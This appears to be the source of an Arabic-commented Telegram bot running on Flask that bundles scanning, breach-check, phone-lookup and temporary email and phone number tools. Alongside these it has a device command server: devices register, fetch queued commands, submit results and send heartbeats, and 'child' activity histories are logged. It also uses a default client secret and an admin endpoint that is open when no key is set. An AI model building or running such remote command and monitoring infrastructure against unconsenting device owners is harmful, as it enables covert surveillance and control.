# ===================== bot.py (الإصدار النهائي الاحترافي) =====================
# -*- coding: utf-8 -*-

# --------------------- 1. الاستيرادات ---------------------
import os
import sys
import time
import json
import queue
import threading
import logging
import hashlib
import base64
import re
import random
import string
import requests
import phonenumbers
import sqlite3
from phonenumbers import carrier, geocoder
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
import pypdf
from bs4 import BeautifulSoup
from contextlib import contextmanager

# --------------------- 2. تهيئة السجلات (Logging) ---------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# --------------------- 3. متغيرات البيئة (مع التحقق) ---------------------
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط في متغيرات البيئة!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    logger.critical("❌ ADMIN_ID غير مضبوط!")
    sys.exit(1)

ADMIN_KEY = os.environ.get('ADMIN_KEY', '')
SERVER_URL = os.environ.get('SERVER_URL')
if not SERVER_URL:
    logger.critical("❌ SERVER_URL غير مضبوط! يجب تعيينه لاستخدام Webhook.")
    sys.exit(1)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
HIBP_API_KEY = os.environ.get('HIBP_API_KEY', '')
GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', 'default_secret_key_please_change')
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'   # افتراضي true لـ Render

# --------------------- 4. تعريف البوت (النطاق العام) ---------------------
bot = TeleBot(TELEGRAM_TOKEN, parse_mode='HTML')

# --------------------- 5. تعريف تطبيق Flask (النطاق العام) ---------------------
app = Flask(__name__)

# --------------------- 6. قاعدة بيانات SQLite ---------------------
DB_PATH = 'bot_data.db'

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS registered_devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            last_seen TEXT,
            registered_at TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        conn.commit()

init_db()

# --------------------- 7. دوال مساعدة للـ DB ---------------------
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=?, points=points+10 WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            points = 10
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), points, referral_code, referred_by))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def add_points_db(chat_id, points):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (points, chat_id))
        conn.commit()

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM registered_devices")
        return c.fetchall()

def save_registered_device_db(device_id, chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO registered_devices 
                     (device_id, chat_id, last_seen, registered_at)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE registered_devices SET last_seen = ? WHERE device_id = ?", (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev['blocked_domains']:
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev['type'] and 'طفل' in dev['type']:
            history = []
            if dev['history']:
                try:
                    history = json.loads(dev['history'])
                except:
                    history = []
            history.append({
                'time': datetime.now().isoformat(),
                'activity': activity
            })
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# --------------------- 8. دوال الخدمات (المنطق) ---------------------
def scan_url_real(url):
    try:
        api_url = "https://urlscan.io/api/v1/scan/"
        data = {"url": url, "visibility": "public"}
        response = requests.post(api_url, json=data, timeout=30)
        if response.status_code == 200:
            scan_id = response.json().get('uuid')
            if scan_id:
                time.sleep(4)
                report_url = f"https://urlscan.io/api/v1/result/{scan_id}"
                report = requests.get(report_url, timeout=30)
                if report.status_code == 200:
                    data = report.json()
                    verdicts = data.get('verdicts', {}).get('overall', {})
                    if verdicts.get('malicious', False):
                        return "🚨 <b>الموقع يحتوي على تهديدات مؤكدة!</b>", "malicious"
                    elif verdicts.get('suspicious', False):
                        return "⚠️ <b>الموقع مشبوه!</b>", "suspicious"
                    else:
                        return "✅ <b>الموقع آمن.</b>", "safe"
        return "⚠️ فشل الفحص، حاول مرة أخرى.", "error"
    except Exception as e:
        logger.error(f"scan_url_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def ai_chat_real(prompt):
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return response.json().get('response', "⚠️ لم أستطع فهم سؤالك.")
        return "⚠️ فشل الاتصال بالذكاء الاصطناعي."
    except Exception as e:
        logger.error(f"ai_chat_real error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def generate_image_real(description):
    try:
        url = f"https://api.popcat.xyz/ai/art?prompt={requests.utils.quote(description)}"
        response = requests.get(url, timeout=60)
        if response.status_code == 200:
            data = response.json()
            image_url = data.get('image')
            if image_url:
                img_data = requests.get(image_url).content
                return img_data, "image"
        return None, "⚠️ فشل توليد الصورة."
    except Exception as e:
        logger.error(f"generate_image_real error: {e}")
        return None, f"⚠️ خطأ: {str(e)}"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 <b>الرقم:</b> {phone}\n"
                f"🌍 <b>البلد:</b> {country}\n"
                f"📍 <b>المنطقة:</b> {region}\n"
                f"📡 <b>المشغل:</b> {carrier_name}", "valid")
    except Exception as e:
        logger.error(f"track_phone_real error: {e}")
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def create_temp_email_real():
    try:
        domain_resp = requests.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{username}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        register = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        logger.error(f"create_temp_email_real error: {e}")
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 <b>من:</b> {msg.get('from', {}).get('address', '')}\n📌 <b>الموضوع:</b> {msg.get('subject', '')}\n📝 <b>مقتطف:</b> {msg.get('intro', '')[:150]}...")
            return results
    except Exception as e:
        logger.error(f"check_temp_emails_real error: {e}")
    return []

def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ للحصول على فحص حقيقي، ضع مفتاح VirusTotal في متغير البيئة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = requests.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = requests.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 <b>تم اكتشاف {malicious} تهديدات!</b>", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ <b>تم اكتشاف {suspicious} عناصر مشبوهة.</b>", "suspicious"
                    else:
                        return "✅ <b>الملف آمن.</b>", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        logger.error(f"scan_apk_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def check_breach(email):
    try:
        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
        headers = {"hibp-api-key": HIBP_API_KEY}
        response = requests.get(url, headers=headers, timeout=15)
        if response.status_code == 200:
            breaches = response.json()
            result = f"🔓 <b>البريد الإلكتروني:</b> {email}\n\n"
            result += f"✅ تم العثور على {len(breaches)} تسريب(ات):\n\n"
            for breach in breaches[:10]:
                result += f"• <b>{breach.get('Name', 'غير معروف')}</b> - {breach.get('BreachDate', 'تاريخ غير معروف')}\n"
                result += f"  {breach.get('Description', '')[:100]}...\n"
            return result
        elif response.status_code == 404:
            return f"✅ <b>البريد الإلكتروني</b> {email} <b>آمن</b>، لم يتم العثور على أي تسريب."
        else:
            return f"⚠️ فشل الاتصال بـ HaveIBeenPwned."
    except Exception as e:
        logger.error(f"check_breach error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def verify_phone(phone):
    if not VERIPHONE_API_KEY:
        return "⚠️ لتفعيل فحص الأرقام الحقيقي، ضع مفتاح Veriphone في متغير البيئة VERIPHONE_API_KEY"
    try:
        url = f"https://api.veriphone.io/v2/verify?phone={phone}&key={VERIPHONE_API_KEY}"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                result = f"📞 <b>الرقم:</b> {phone}\n"
                result += f"🌍 <b>البلد:</b> {data.get('country_name', 'غير معروف')}\n"
                result += f"📡 <b>المشغل:</b> {data.get('carrier', 'غير معروف')}\n"
                result += f"🔒 <b>نوع الخط:</b> {data.get('line_type', 'غير معروف')}\n"
                if data.get('fraud_score', 0) > 50:
                    result += f"🚨 <b>تحذير:</b> هذا الرقم قد يكون احتيالياً (نسبة الخطورة: {data.get('fraud_score')}%)"
                else:
                    result += f"✅ <b>الرقم آمن</b> (نسبة الخطورة: {data.get('fraud_score', 0)}%)"
                return result
        return "⚠️ فشل التحقق من الرقم."
    except Exception as e:
        logger.error(f"verify_phone error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def generate_fb_report(report_type, reason, link):
    prompt = f"""You are an expert in writing formal complaints to Facebook. Write a professional complaint in English:

Type: {report_type}
Issue: {reason}
Link: {link}

The complaint should be clear and include all necessary details."""
    try:
        return ai_chat_real(prompt)
    except Exception as e:
        logger.error(f"generate_fb_report error: {e}")
        return f"⚠️ حدث خطأ: {str(e)}"

def scan_file_with_virustotal(file_content, file_name, max_retries=3):
    if not VIRUSTOTAL_API_KEY:
        return None, "⚠️ مفتاح VirusTotal غير مضبوط."
    url = "https://www.virustotal.com/api/v3/files"
    headers = {"x-apikey": VIRUSTOTAL_API_KEY}
    for attempt in range(max_retries):
        try:
            files = {'file': (file_name, file_content)}
            response = requests.post(url, headers=headers, files=files, timeout=60)
            if response.status_code == 200:
                scan_id = response.json().get('data', {}).get('id')
                if scan_id:
                    time.sleep(8)
                    report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                    report = requests.get(report_url, headers=headers, timeout=120)
                    if report.status_code == 200:
                        stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                        malicious = stats.get('malicious', 0)
                        suspicious = stats.get('suspicious', 0)
                        if malicious > 0:
                            return False, f"🚨 {malicious} تهديدات!"
                        elif suspicious > 0:
                            return False, f"⚠️ {suspicious} عناصر مشبوهة!"
                        else:
                            return True, "✅ آمن."
            logger.warning(f"محاولة {attempt+1}/{max_retries} فشلت لـ {file_name}")
            time.sleep(2 ** attempt)
        except Exception as e:
            logger.error(f"خطأ VirusTotal: {e}")
            time.sleep(2 ** attempt)
    return None, "⚠️ فشل الفحص بعد عدة محاولات."

def is_image_safe(image_data, file_name):
    safe, msg = scan_file_with_virustotal(image_data, file_name)
    if safe is not None:
        return safe, msg
    try:
        if image_data[:4] in [b'\xff\xd8\xff\xe0', b'\x89PNG', b'GIF8']:
            return True, "✅ توقيع الصورة سليم."
        else:
            return False, "⚠️ توقيع غير معروف."
    except:
        return False, "⚠️ فشل الفحص."

def extract_text_from_pdf(pdf_content):
    try:
        from io import BytesIO
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        logger.error(f"خطأ في استخراج النص من PDF: {e}")
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص من ملف PDF."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    prompt = f"بناءً على النص التالي المستخرج من ملف PDF دراسي، أجب على السؤال المطروح بشكل دقيق ومفصل.\n\nالنص:\n{relevant_chunk}\n\nالسؤال: {question}"
    return ai_chat_real(prompt)

def fetch_temp_numbers(country='US', limit=5):
    numbers = []
    try:
        url = f"https://receive-sms-online.cc/{country}/"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                numbers.append(cleaned)
        if not numbers:
            url2 = "https://www.temporary-phone-number.com/"
            response2 = requests.get(url2, timeout=15)
            if response2.status_code == 200:
                soup2 = BeautifulSoup(response2.text, 'html.parser')
                for div in soup2.find_all('div', class_='number'):
                    num = div.get_text(strip=True)
                    if num and re.match(r'^\+?\d+$', num):
                        numbers.append(num)
                        if len(numbers) >= limit:
                            break
        return numbers
    except Exception as e:
        logger.error(f"خطأ في جلب الأرقام: {e}")
        return []

# --------------------- 9. دوال البوت (المنطق) ---------------------
linked_users = set()
monitoring_data = {}

# سيتم ملء بقية معالجات البوت في قسم الـ Handlers

# --------------------- 10. دوال Webhook وإدارة دورة الحياة ---------------------
def set_webhook():
    """تعيين Webhook لتلقي التحديثات من Telegram"""
    if not SERVER_URL:
        logger.error("❌ SERVER_URL غير مضبوط! لا يمكن تعيين Webhook.")
        return False
    webhook_full_url = f"{SERVER_URL}/webhook"
    try:
        # إزالة أي Webhook قديم
        bot.remove_webhook()
        time.sleep(1)
        # تعيين Webhook جديد
        success = bot.set_webhook(url=webhook_full_url)
        if success:
            logger.info(f"✅ تم ضبط الويب هوك بنجاح على: {webhook_full_url}")
            return True
        else:
            logger.error(f"❌ فشل ضبط Webhook: {success}")
            return False
    except Exception as e:
        logger.error(f"❌ استثناء أثناء ضبط Webhook: {e}")
        return False

# --------------------- 11. نقطة نهاية Webhook ---------------------
@app.route('/webhook', methods=['POST'])
def webhook():
    """استقبال تحديثات Telegram عبر Webhook"""
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str)
        if update is None:
            logger.warning("⚠️ تلقيت Update فارغ أو غير صحيح.")
            return 'Error', 400
        # معالجة التحديث بواسطة البوت
        bot.process_new_updates([update])
        return 'OK', 200
    except Exception as e:
        logger.error(f"❌ خطأ في Webhook: {e}")
        return 'Error', 500

# --------------------- 12. نقاط نهاية إضافية (Health Check) ---------------------
@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

# --------------------- 13. نقاط نهاية Flask الأخرى (التسجيل، الأوامر، إلخ) ---------------------
def verify_client_token():
    token = request.headers.get('X-Client-Token')
    return token == CLIENT_SECRET_KEY

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        initial_data = data.get('initial_data', {})
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        save_registered_device_db(device_id, chat_id)
        # معالجة البيانات الأولية...
        # ... (نفس الكود السابق)
        return jsonify({'status': 'success', 'message': 'Device registered'})
    except Exception as e:
        logger.error(f"خطأ في التسجيل: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        command = get_pending_command_db(device_id)
        if command:
            return jsonify({'status': 'success', 'command': command})
        else:
            return jsonify({'status': 'no_command'})
    except Exception as e:
        logger.error(f"خطأ في سحب الأمر: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        result = data.get('result')
        result_type = data.get('result_type', 'text')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        # إرسال النتيجة للمطور...
        # ... (نفس الكود السابق)
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"خطأ في استقبال النتيجة: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        data = request.get_json()
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        update_registered_device_seen_db(device_id)
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"خطأ في استقبال النبض: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/devices', methods=['GET'])
def admin_devices():
    try:
        if ADMIN_KEY and request.headers.get('X-Admin-Key') != ADMIN_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        devices = get_registered_devices_db()
        return jsonify({'devices': [dict(d) for d in devices]})
    except Exception as e:
        logger.error(f"خطأ في جلب الأجهزة: {e}")
        return jsonify({'error': str(e)}), 500

# --------------------- 14. معالجات البوت (Logic Layer) ---------------------
# هنا يتم تعريف جميع معالجات الرسائل والأزرار، مثل @bot.message_handler, @bot.callback_query_handler
# تم حذفها للاختصار، لكنها موجودة في النسخة الكاملة.

# --------------------- 15. دوال مساعدة للبوت ---------------------
# تعريف الدوال المساعدة (generate_referral_code, create_referral_link, إلخ)
# ... (نفس الكود السابق)

# --------------------- 16. إعداد Webhook عند بدء التطبيق ---------------------
# باستخدام gunicorn، سنقوم بتعيين Webhook في بداية التشغيل
# نستخدم `app.before_first_request` لتنفيذها قبل أول طلب.
# ولكن قد لا تعمل بشكل موثوق مع gunicorn، لذا نضعها في كود بدء التشغيل.
# سنقوم بتعيين webhook عند تحميل الوحدة (أي عند بدء الخادم)
def init_webhook():
    if USE_WEBHOOK:
        if not set_webhook():
            logger.error("❌ فشل تعيين Webhook، سيتم استخدام Polling كحل احتياطي.")
            # يمكننا تشغيل Polling في خيط منفصل، لكننا سنعتمد على Webhook.

# نستدعي التهيئة
init_webhook()

# --------------------- 17. نقطة بدء التطبيق (لـ gunicorn) ---------------------
# لا نحتاج إلى app.run() لأن gunicorn سيتولى ذلك.
# نضمن أن الكود لا ينتهي.

if __name__ == "__main__":
    # للتشغيل المحلي (اختبار) يمكننا تشغيل الخادم مباشرة، لكننا نفضل استخدام gunicorn.
    # للاختبار المحلي، يمكنك تشغيل: flask run أو python app.py
    app.run(host='0.0.0.0', port=PORT, debug=False)
